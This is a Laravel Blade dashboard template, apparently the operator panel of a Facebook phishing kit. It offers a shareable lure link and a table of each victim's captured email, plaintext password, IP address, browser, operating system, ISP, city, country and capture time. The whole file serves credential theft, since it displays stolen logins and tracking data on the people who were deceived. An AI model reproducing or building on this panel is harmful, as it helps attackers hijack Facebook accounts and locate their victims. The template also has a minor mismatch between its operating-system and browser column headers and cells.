@extends('layouts.dashboard')

@section('content')

<div class="row justify-content-center">
    <div class="col-md-12">
        <div class="">
            <div class="">{{ __('Facebook') }}
                <hr>
                <p><strong>Share this link: </strong><a href="{{ route('snprobbx') }}" target="_blank" rel="noopener noreferrer">{{ __('Facebook') }}</a></p>
            </div>
            
                
            <table class="table table-bordered table-striped table-hover">
                <thead>
                    <tr>
                        <th>email</th>
                        <th>password</th>
                        <th>ip</th>
                        <th>Sistema operativo</th>
                        <th>Navegador</th>
                        <th>isp</th>
                        <th>city</th>
                        <th>country</th>
                        <th>time</th>
                    </tr>
                </thead>
                <tbody>
                    @foreach ($dataFacebook as $dataF)
                    <tr>
                        <td>{{ $dataF->email }}</td>
                        <td>{{ $dataF->password }}</td>
                        <td>{{ $dataF->ip }}</td>
                        <td>{{ $dataF->browser }}</td>
                        <td>{{ $dataF->os }}</td>
                        <td>{{ $dataF->isp }}</td>
                        <td>{{ $dataF->city }}</td>
                        <td>{{ $dataF->country }}</td>
                        <td>{{ $dataF->created_at }}</td>
                    </tr>
                    @endforeach
                </tbody>
            </table>

            
        </div>
    </div>
</div>

@endsection
